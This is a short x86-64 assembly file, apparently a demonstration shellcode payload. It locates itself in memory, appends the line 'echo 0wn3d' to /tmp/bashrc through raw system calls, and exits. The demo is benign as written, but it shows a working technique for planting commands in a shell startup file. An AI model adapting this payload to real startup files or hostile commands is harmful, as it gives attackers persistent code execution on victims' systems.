bits 64
;rdi, rsi, rdx
%define sys_write 1 ;fd, *buf, count
%define sys_open 2 ;*fn, flags, mode
%define O_APPEND 0x400
%define O_RDWR 0x2
%define sys_exit 60 ;code
%define abs(a) (rbx+a-x)

	call x
x:	pop rbx
;rbx now contains the address of x

	mov rax, sys_open
	lea rdi, [abs(fn)]
	mov rsi, O_APPEND|O_RDWR
	mov rdx, 0777
	syscall

	mov rdi, rax
	mov rax, sys_write
	lea rsi, [abs(s)]
	mov rdx, s_len-s
	syscall

	mov rax, sys_exit
	mov rdi, 42
	syscall

fn:	db "/tmp/bashrc", 0
s:	db "echo 0wn3d", 10
s_len:
